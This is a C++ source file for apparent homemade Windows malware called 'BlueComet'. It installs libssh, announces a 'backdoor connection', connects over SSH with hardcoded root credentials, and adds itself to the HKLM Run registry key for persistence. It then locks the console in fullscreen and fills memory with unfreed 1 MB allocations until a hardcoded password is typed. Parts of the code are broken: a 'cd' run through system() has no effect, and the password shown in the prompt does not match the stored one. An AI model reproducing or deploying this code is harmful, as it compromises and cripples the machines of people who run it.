/*@@@  @@@   @@@@@@   @@@@@@@    @@@@@@    @@@@@@   */
/*@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  */
/*@@!  !@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  */
/*!@!  @!!  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  */
/*@!@@!@!   @!@!@!@!  @!@@!@!   @!@  !@!  @!@  !@!  */
/*!!@!!!    !!!@!!!!  !!@!!!    !@!  !!!  !@!  !!!  */
/*!!: :!!   !!:  !!!  !!:       !!:  !!!  !!:  !!!  */
/*:!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  !:!  */
/* ::  :::  ::   :::   ::       ::::: ::  ::::: ::  */
/* :   :::   :   : :   :         : :  :    : :  :   */


#include <iostream>
#include <string>
#include <fstream>
#include <cstring>
#include <libssh/libssh.h>
#include <windows.h>
#include <cstdlib>
#include <cstdio>
#include <io.h>

using namespace std;

ssh_session ssh_connect_to_server(const char* host, int port, const char* username, const char* password) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        cerr << "Error creating SSH session" << endl;
        return NULL;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc");

    int rc = ssh_connect(session);
    while (rc != SSH_OK) {
        cerr << "Error connecting to SSH server: " << ssh_get_error(session) << endl;
        ssh_disconnect(session);
        ssh_free(session);

        // Try to reconnect after 5 seconds
        SleepEx(5000, FALSE);

        session = ssh_new();
        if (session == NULL) {
            cerr << "Error creating SSH session" << endl;
            return NULL;
        }

        ssh_options_set(session, SSH_OPTIONS_HOST, host);
        ssh_options_set(session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(session, SSH_OPTIONS_USER, username);
        ssh_options_set(session, SSH_OPTIONS_CIPHERS_C_S, "aes256-cbc");

        rc = ssh_connect(session);
    }

    rc = ssh_userauth_password(session, NULL, password);
    if (rc != SSH_AUTH_SUCCESS) {
        cerr << "Error authenticating with SSH server: " << ssh_get_error(session) << endl;
        ssh_disconnect(session);
        ssh_free(session);
        return NULL;
    }

    return session;
}

/*VCPKG function*/

void installVcpkg() {
    const std::string vcpkgUrl = "https://github.com/microsoft/vcpkg/archive/refs/tags/2022.02.zip";
    const std::string vcpkgZip = "vcpkg.zip";
    const std::string vcpkgDir = "vcpkg-2022.02";

    std::cout << "Checking if vcpkg is already installed..." << std::endl;

    // Check if vcpkg directory already exists
    if (_access(vcpkgDir.c_str(), 0) == 0) {
        std::cout << "vcpkg is already installed. Exiting." << std::endl;
        return;
    }

    std::cout << "Downloading vcpkg..." << std::endl;

    // Download vcpkg zip file
    std::system(("powershell -Command \"Invoke-WebRequest -Uri "
                 + vcpkgUrl + " -OutFile " + vcpkgZip + "\"").c_str());

    // Unzip vcpkg
    std::system(("powershell -Command \"Expand-Archive -Path .\\"
                 + vcpkgZip + " -DestinationPath .\"").c_str());

    // Change directory to vcpkg
    std::system(("cd " + vcpkgDir).c_str());

    // Bootstrap vcpkg
    std::system(".\\bootstrap-vcpkg.bat");

    std::cout << "vcpkg installation complete." << std::endl;
}

/*Install LibSSH*/

int installLibssh() {
    std::cout << "BlueComet is establishing a backdoor connection." << std::endl;

    // Check if libssh is already installed
    int result = std::system("vcpkg list libssh --x-install-root | findstr /C:\"libssh\" > nul");
    if (result == 0) {
        std::cout << "libssh is already installed. Exiting." << std::endl;
        return 0;
    }

    std::cout << "Installing..." << std::endl;

    // Install libssh
    result = std::system("vcpkg install libssh");

    std::cout << "BlueComet is ready for remote connection." << std::endl;

    return result;
}


int main() {


/* Check if VCPKG is installed, if not install*/

    installVcpkg();


/*Install Libssh*/


    std::cout << "BlueComet is persistent." << std::endl;

    // Install libssh if not already installed
    int result = installLibssh();

    if (result == 0) {
        std::cout << "libssh installation successful." << std::endl;
    } else {
        std::cout << "libssh installation failed." << std::endl;
    }

 
/*set up remote connection for all hosts*/

{

    ssh_session session = ssh_connect_to_server("0.0.0.0", 2345, "root", "toor");
    if (session == NULL) {
        return 1;
    }


    /* Create registry to include BlueComet in startup on all local machines */

    char re[MAX_PATH];
    string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));

    HKEY hKey;
    LONG ln = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    if (ln != ERROR_SUCCESS) {
        cerr << "Error opening registry key" << endl;
        return 1;
    }

    ln = RegSetValueEx(hKey, "BlueComet", 0, REG_SZ, (const BYTE*)FP.c_str(), (DWORD)FP.size() + 1);
    if (ln != ERROR_SUCCESS) {
        cerr << "Error setting registry value" << endl;
        RegCloseKey(hKey);
        return 1;
    }

    RegCloseKey(hKey);

    /* Password to stop memory crash is P@thf1nder */
    const char password[] = { 'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0' };
    char input[11];
    bool stopProgram = false;
    int loopCount = 0;

    /* Set console to full screen mode */
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    SetConsoleDisplayMode(hConsole, CONSOLE_FULLSCREEN_MODE, &csbi);

    while (!stopProgram) {
        for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
            char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
            memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
        }
	/*Pull Current Memory Status*/
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        GlobalMemoryStatusEx(&status);
        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed. " << status.ullTotalPhys / (1024 * 1024) << " MB of memory remaining." << endl;
        loopCount++;
	/*Enter Password: Pathf1nder to stop. Remove BlueComet from registry to remove program.*/
        cout << "Enter password P@thF1nder to stop the program: ";
        cin >> input;
        if (strcmp(input, password) == 0) {
            cout << "Password correct. Stopping program. Remove BlueComet from memory or this will happen again." << endl;
            stopProgram = true;
        }
    }
    return 0;
}
   
